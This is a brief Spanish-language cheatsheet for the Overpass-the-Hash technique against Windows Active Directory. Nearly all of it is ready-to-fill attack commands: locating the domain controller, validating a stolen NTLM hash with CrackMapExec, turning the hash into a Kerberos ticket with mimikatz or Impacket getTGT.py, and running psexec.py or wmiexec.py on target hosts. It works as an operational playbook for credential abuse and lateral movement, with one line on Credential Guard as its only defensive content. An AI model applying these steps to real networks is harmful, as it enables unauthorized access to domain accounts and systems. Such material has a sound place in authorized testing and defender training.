**\[Overpass-the-Hash Cheatsheet]**

---

**Escenario**: Autenticación contra servicios Kerberos (WinRM, SMB, RDP) utilizando el hash NTLM para solicitar un TGT.

**Requisitos Previos**:

* Hash NTLM de un usuario de dominio (obtenido con mimikatz, responder, etc.).
* Nombre del dominio y del usuario asociado al hash.
* Acceso a la red del controlador de dominio (DC).
* El hash debe ser del tipo NTLM (no solo LM).

---

**Enumeración del Entorno**:

* Identificar el DC:

  ```bash
  nmap -p 88,445,389 <target-range>
  crackmapexec smb <target-range> --users
  ```
* Validar que el hash es de un usuario del dominio:

  ```bash
  crackmapexec smb <ip_dc> -u <user> -H <hash>
  ```
* Confirmar acceso a puertos Kerberos y WinRM:

  ```bash
  nmap -p 88,5985 <target>
  ```

---

**Explotación (Overpass-the-Hash)**:

* Obtener un TGT con `mimikatz` (desde Windows):

  ```text
  sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
  ```

  Esto inicia una sesión con TGT en memoria.

* Usar `impacket-getTGT` (desde Kali):

  ```bash
  getTGT.py <domain>/<user> -hashes :<NTLM_hash>
  ```

  Esto genera un archivo `.ccache` para Kerberos.

* Usar ticket Kerberos con `psexec.py`, `wmiexec.py`, etc.:

  ```bash
  export KRB5CCNAME=<user>.ccache
  psexec.py <domain>/<user>@<target>
  ```

---

**Notas Adicionales**:

* Solo funciona si el usuario tiene permitido solicitar TGT.
* Credential Guard puede impedir uso de TGT en memoria.
* Overpass-the-Hash = Pass-the-Key (nombre alternativo).

---

**Herramientas Recomendadas**:

* Mimikatz (Windows)
* Impacket (`getTGT.py`, `psexec.py`, `wmiexec.py`)
* CrackMapExec (para validación y acceso remoto)
* Kerberos tooling: `klist`, `kinit`, `export KRB5CCNAME`
